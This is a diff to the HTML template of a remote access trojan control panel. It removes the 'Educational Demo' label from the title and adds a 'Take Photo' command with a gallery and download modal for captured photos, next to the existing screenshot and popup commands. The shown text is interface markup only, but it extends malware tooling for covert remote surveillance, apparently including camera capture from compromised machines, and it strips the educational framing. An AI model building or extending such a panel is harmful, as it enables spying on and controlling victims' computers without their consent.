@@ -17,7 +17,7 @@
                     <div class="container-fluid">
                         <span class="navbar-brand mb-0 h1">
                             <i class="fas fa-shield-alt"></i>
-                            RAT Control Panel - Educational Demo
+                            RAT Control Panel
                         </span>
                         <div class="d-flex">
                             <span id="server-status" class="badge bg-secondary me-2">Server Stopped</span>
@@ -83,6 +83,9 @@
                             <button id="cmd-screenshot" class="btn btn-primary" disabled>
                                 <i class="fas fa-camera"></i> Take Screenshot
                             </button>
+                            <button id="cmd-photo" class="btn btn-success" disabled>
+                                <i class="fas fa-camera-retro"></i> Take Photo
+                            </button>
                             <button id="cmd-popup" class="btn btn-warning" disabled>
                                 <i class="fas fa-exclamation-triangle"></i> Show Popup
                             </button>
@@ -133,7 +136,7 @@
 
         <!-- Screenshots Section -->
         <div class="row mt-3">
-            <div class="col-12">
+            <div class="col-md-6">
                 <div class="card">
                     <div class="card-header">
                         <h5><i class="fas fa-images"></i> Screenshots</h5>
@@ -141,6 +144,20 @@
                     <div class="card-body">
                         <div id="screenshots-container" class="row">
                             <p class="text-muted">Screenshots will appear here when captured...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Photos Section -->
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-camera-retro"></i> Photos</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="photos-container" class="row">
+                            <p class="text-muted">Photos will appear here when captured...</p>
                         </div>
                     </div>
                 </div>
@@ -162,6 +179,25 @@
                 <div class="modal-footer">
                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                     <a id="download-screenshot" class="btn btn-primary" href="" download="">Download</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Photo Modal -->
+    <div class="modal fade" id="photoModal" tabindex="-1">
+        <div class="modal-dialog modal-xl">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Photo</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body text-center">
+                    <img id="modal-photo" class="img-fluid" src="" alt="Photo">
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <a id="download-photo" class="btn btn-success" href="" download="">Download</a>
                 </div>
             </div>
         </div>
